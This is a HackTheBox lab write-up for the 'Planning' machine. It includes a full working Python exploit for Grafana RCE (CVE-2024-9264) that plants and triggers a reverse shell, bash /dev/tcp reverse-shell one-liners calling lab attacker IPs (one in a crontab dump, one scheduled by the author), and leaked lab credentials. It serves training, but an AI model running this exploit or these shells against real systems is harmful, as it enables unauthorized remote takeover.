---
title: Planning - HackTheBox
date: 2025-07-08
categories: [Writeups, HTB]
tags: [Linux, HTB, Grafana, Container, Cronjob]
image: /assets/img/commons/planning/planning.png
---

In this write-up, I detail the complete process to solve this machine, including the phases of reconnaissance, enumeration, exploitation, and post-exploitation.

- **Machine:** [Planning](https://app.hackthebox.com/machines/Planning)
- **System:** Linux
- **Difficulty:** <span style="color: green; font-weight: bold;">Easy</span>

## Reconnaissance

First, I check connectivity using `ping` with the target machine to ensure it is accessible on the network:

```bash
ping -c 1 10.10.11.68
PING 10.10.11.68 (10.10.11.68) 56(84) bytes of data.
64 bytes from 10.10.11.68: icmp_seq=1 ttl=63 time=48.9 ms

--- 10.10.11.68 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 48.929/48.929/48.929/0.000 ms
```

## Enumeration

Now, I perform a scan with `nmap` to identify open ports on the target:

```bash
nmap -p- --open 10.10.11.68 --min-rate 5000 -oN ports.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-08 15:35 CEST
Nmap scan report for 10.10.11.68
Host is up (0.15s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

After discovering open ports 22 (SSH) and 80 (HTTP), I enumerate service versions and run default scripts to gather more detailed information:

```bash
nmap -p22,80 -sV -sC 10.10.11.68 -oN targeted.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-08 15:36 CEST
Nmap scan report for 10.10.11.68
Host is up (0.056s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 62:ff:f6:d4:57:88:05:ad:f4:d3:de:5b:9b:f8:50:f1 (ECDSA)
|_  256 4c:ce:7d:5c:fb:2d:a0:9e:9f:bd:f5:5c:5e:61:50:8a (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://planning.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.99 seconds
```

Next, I performed directory enumeration using `ffuf`:

```bash
ffuf -u http://planning.htb/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -mc 200,301,302 -t 200

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://planning.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: 200,301,302
________________________________________________

img                     [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 120ms]
css                     [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 53ms]
lib                     [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 55ms]
js                      [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 53ms]
```

I am going to try to explore subdomains by sending requests with different Hosts headers:

```bash
ffuf -u http://planning.htb -H "Host:FUZZ.planning.htb" -w /usr/share/seclists/Discovery/DNS/namelist.txt -t 100

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://planning.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/namelist.txt
 :: Header           : Host: FUZZ.planning.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

4                       [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 55ms]
3                       [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 51ms]
01                      [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 51ms]
```

The default error page has a size of 178 bytes, so  I am going to filter out those responses to focus on potentially valid subdomains:

```bash
ffuf -u http://planning.htb -H "Host:FUZZ.planning.htb" -w /usr/share/seclists/Discovery/DNS/namelist.txt -t 100 -fs 178

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://planning.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/namelist.txt
 :: Header           : Host: FUZZ.planning.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 178
________________________________________________

grafana                 [Status: 302, Size: 29, Words: 2, Lines: 3, Duration: 64ms]
:: Progress: [151265/151265] :: Job [1/1] :: 1457 req/sec :: Duration: [0:01:22] :: Errors: 0 ::
```

## Exploitation

First, I use `searchsploit` to check for any public exploits associated with the detected service versions, but no relevant exploits are found in Exploit-DB:

```bash
searchsploit OpenSSH 9.6p1
Exploits: No Results
Shellcodes: No Results

searchsploit nginx 1.24.0
Exploits: No Results
Shellcodes: No Results
```

Next, I am going to access grafana panel and checkout version (Grafana v11.0.0):

![web](/assets/img/commons/planning/grafana.png){: .center-image }

There is a CVE for this version (CVE-2024-9264):

```py
import requests
import argparse

"""
Grafana Remote Code Execution (CVE-2024-9264) via SQL Expressions
See here: https://grafana.com/blog/2024/10/17/grafana-security-release-critical-severity-fix-for-cve-2024-9264/

Author: z3k0sec // www.zekosec.com
"""

def authenticate(grafana_url, username, password):
    """
    Authenticate to the Grafana instance.

    Args:
        grafana_url (str): The URL of the Grafana instance.
        username (str): The username for authentication.
        password (str): The password for authentication.

    Returns:
        session (requests.Session): The authenticated session.
    """
    # Login URL
    login_url = f'{grafana_url}/login'

    # Login payload
    payload = {
        'user': username,
        'password': password
    }

    # Create a session to persist cookies
    session = requests.Session()

    # Perform the login
    response = session.post(login_url, json=payload)

    # Check if the login was successful
    if response.ok:
        print("[SUCCESS] Login successful!")
        return session  # Return the authenticated session
    else:
        print("[FAILURE] Login failed:", response.status_code, response.text)
        return None  # Return None if login fails

def create_reverse_shell(session, grafana_url, reverse_ip, reverse_port):
    """
    Create a malicious reverse shell payload in Grafana.

    Args:
        session (requests.Session): The authenticated session.
        grafana_url (str): The URL of the Grafana instance.
        reverse_ip (str): The IP address for the reverse shell.
        reverse_port (str): The port for the reverse shell.
    """
    # Construct the reverse shell command
    reverse_shell_command = f"/dev/tcp/{reverse_ip}/{reverse_port} 0>&1"

    # Define the payload to create a reverse shell
    payload = {
        "queries": [
            {
                "datasource": {
                    "name": "Expression",
                    "type": "__expr__",
                    "uid": "__expr__"
                },
                # Using the reverse shell command from the arguments
                "expression": f"SELECT 1;COPY (SELECT 'sh -i >& {reverse_shell_command}') TO '/tmp/rev';",
                "hide": False,
                "refId": "B",
                "type": "sql",
                "window": ""
            }
        ]
    }

    # Send the POST request to execute the payload
    response = session.post(
        f"{grafana_url}/api/ds/query?ds_type=__expr__&expression=true&requestId=Q100",
        json=payload
    )

    if response.ok:
        print("Reverse shell payload sent successfully!")
        print("Set up a netcat listener on " + reverse_port)
    else:
        print("Failed to send payload:", response.status_code, response.text)

def trigger_reverse_shell(session, grafana_url):
    """
    Trigger the reverse shell binary.

    Args:
        session (requests.Session): The authenticated session.
        grafana_url (str): The URL of the Grafana instance.
    """
    # SQL command to trigger the reverse shell
    payload = {
        "queries": [
            {
                "datasource": {
                    "name": "Expression",
                    "type": "__expr__",
                    "uid": "__expr__"
                },
                # install and load the community extension "shellfs" to execute system commands (here: execute our reverse shell)
                "expression": "SELECT 1;install shellfs from community;LOAD shellfs;SELECT * FROM read_csv('bash /tmp/rev |');",
                "hide": False,
                "refId": "B",
                "type": "sql",
                "window": ""
            }
        ]
    }

    # Trigger the reverse shell via POST
    response = session.post(
        f"{grafana_url}/api/ds/query?ds_type=__expr__&expression=true&requestId=Q100",
        json=payload
    )

    if response.ok:
        print("Triggered reverse shell successfully!")
    else:
        print("Failed to trigger reverse shell:", response.status_code, response.text)

def main(grafana_url, username, password, reverse_ip, reverse_port):
    # Authenticate to Grafana
    session = authenticate(grafana_url, username, password)

    if session:
        # Create the reverse shell payload
        create_reverse_shell(session, grafana_url, reverse_ip, reverse_port)

        # Trigger the reverse shell binary
        trigger_reverse_shell(session, grafana_url)

if __name__ == "__main__":
    # Set up command line argument parsing
    parser = argparse.ArgumentParser(description='Authenticate to Grafana and create a reverse shell payload')
    parser.add_argument('--url', required=True, help='Grafana URL (e.g., http://127.0.0.1:3000)')
    parser.add_argument('--username', required=True, help='Grafana username')
    parser.add_argument('--password', required=True, help='Grafana password')
    parser.add_argument('--reverse-ip', required=True, help='Reverse shell IP address')
    parser.add_argument('--reverse-port', required=True, help='Reverse shell port')

    args = parser.parse_args()

    # Call the main function with the provided arguments
    main(args.url, args.username, args.password, args.reverse_ip, args.reverse_port)
```

This script exploits a remote code execution vulnerability (CVE-2024-9264) in Grafana by:

- **Authenticating** to the Grafana instance with provided username and password.

- Using Grafana’s **Expression datasource** feature to run crafted SQL queries.

- The **queries create a reverse shell script (/tmp/rev)** on the target server that connects back to your machine.

- Then, it **executes the reverse shell script using a community extension (shellfs)** that allows running system commands from Grafana.

- When executed, the reverse shell connects back to your IP and port, giving you remote access to the server.

## Post-Exploitation

Now, I am inside the container (root@7ce659d667d7):

```bash
root@7ce659d667d7:~# env
AWS_AUTH_SESSION_DURATION=15m
HOSTNAME=7ce659d667d7
PWD=/usr/share/grafana
AWS_AUTH_AssumeRoleEnabled=true
GF_PATHS_HOME=/usr/share/grafana
AWS_CW_LIST_METRICS_PAGE_LIMIT=500
HOME=/usr/share/grafana
TERM=xterm
AWS_AUTH_EXTERNAL_ID=
SHLVL=2
GF_PATHS_PROVISIONING=/etc/grafana/provisioning
GF_SECURITY_ADMIN_PASSWORD=RioTecRANDEntANT!
GF_SECURITY_ADMIN_USER=enzo
GF_PATHS_DATA=/var/lib/grafana
GF_PATHS_LOGS=/var/log/grafana
PATH=/usr/local/bin:/usr/share/grafana/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
AWS_AUTH_AllowedAuthProviders=default,keys,credentials
GF_PATHS_PLUGINS=/var/lib/grafana/plugins
GF_PATHS_CONFIG=/etc/grafana/grafana.ini
_=/usr/bin/env
OLDPWD=/usr/share/grafana/public
```

### User enzo

I connect via ssh to the server with credentials:
- user: enzo
- password: RioTecRANDEntANT!

```bash
ssh enzo@planning.htb
enzo@planning.htb's password: 
enzo@planning:~$ whoami
enzo
```

### User root

I start by checking my user privileges:

```bash
enzo@planning:~ sudo -l
[sudo] password for enzo: 
Sorry, user enzo may not run sudo on planning.
```

I start by checking if my user enzo belongs to any special groups that might give me extra privileges.

```bash
enzo@planning:~ id
uid=1000(enzo) gid=1000(enzo) groups=1000(enzo)
```

I look for SUID binaries to find potential privilege escalation vectors:

```bash
enzo@planning:~ find / -perm 4000 2>/dev/null
```

I find a crontab database file /opt/crontabs/crontab.db:

```bash
enzo@planning:/opt/crontabs$ cat crontab.db 
{"name":"Grafana backup","command":"/usr/bin/docker save root_grafana -o /var/backups/grafana.tar && /usr/bin/gzip /var/backups/grafana.tar && zip -P P4ssw0rdS0pRi0T3c /var/backups/grafana.tar.gz.zip /var/backups/grafana.tar.gz && rm /var/backups/grafana.tar.gz","schedule":"@daily","stopped":false,"timestamp":"Fri Feb 28 2025 20:36:23 GMT+0000 (Coordinated Universal Time)","logging":"false","mailing":{},"created":1740774983276,"saved":false,"_id":"GTI22PpoJNtRKg0W"}
{"name":"Cleanup","command":"cat root/root.txt >> /tmp/root.txt","schedule":"* * * * *","timestamp":"Tue Jul 08 2025 13:56:17 GMT+0000 (Coordinated Universal Time)","logging":"false","mailing":{},"saved":false,"_id":"gNIRXh1WIc9K7BYX"}
{"name":"","command":"bash -c 'exec bash -i &>/dev/tcp/10.10.14.168/4444 <&1'","schedule":"* * * * *","stopped":false,"timestamp":"Tue Jul 08 2025 15:12:00 GMT+0000 (Coordinated Universal Time)","logging":"false","mailing":{},"created":1751987520623,"saved":false,"_id":"q9UiD59tFnjsPCAJ"}
```

I check open network ports using `ss -tuln`.

```bash
ss -tuln
Netid      State       Recv-Q      Send-Q             Local Address:Port              Peer Address:Port      Process      
udp        UNCONN      0           0                     127.0.0.54:53                     0.0.0.0:*                      
udp        UNCONN      0           0                  127.0.0.53%lo:53                     0.0.0.0:*                      
tcp        LISTEN      0           151                    127.0.0.1:3306                   0.0.0.0:*                      
tcp        LISTEN      0           70                     127.0.0.1:33060                  0.0.0.0:*                      
tcp        LISTEN      0           4096                   127.0.0.1:40245                  0.0.0.0:*                      
tcp        LISTEN      0           4096               127.0.0.53%lo:53                     0.0.0.0:*                      
tcp        LISTEN      0           511                      0.0.0.0:80                     0.0.0.0:*                      
tcp        LISTEN      0           4096                   127.0.0.1:3000                   0.0.0.0:*                      
tcp        LISTEN      0           4096                  127.0.0.54:53                     0.0.0.0:*                      
tcp        LISTEN      0           511                    127.0.0.1:8000                   0.0.0.0:*                      
tcp        LISTEN      0           4096                           *:22                           *:*                     
```

I use SSH local port forwarding to access 127.0.0.1:8000:

```bash
ssh enzo@10.10.11.68 -L 8000:127.0.0.1:8000
```

I confirm the crontab UI shows scheduled jobs and allows me to interact with them:

![web](/assets/img/commons/planning/crontab-ui.png){: .center-image }

Finally, I create a cron job that executes this reverse shell command:

```bash
bash -c "bash -i >& /dev/tcp/10.10.16.57/443 0>&1"
```

Next, I set up a listener on my machine using netcat to catch the incoming reverse shell connection:

```bash
nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.57] from (UNKNOWN) [10.10.11.68] 59592
root@planning:/# whoami
root
```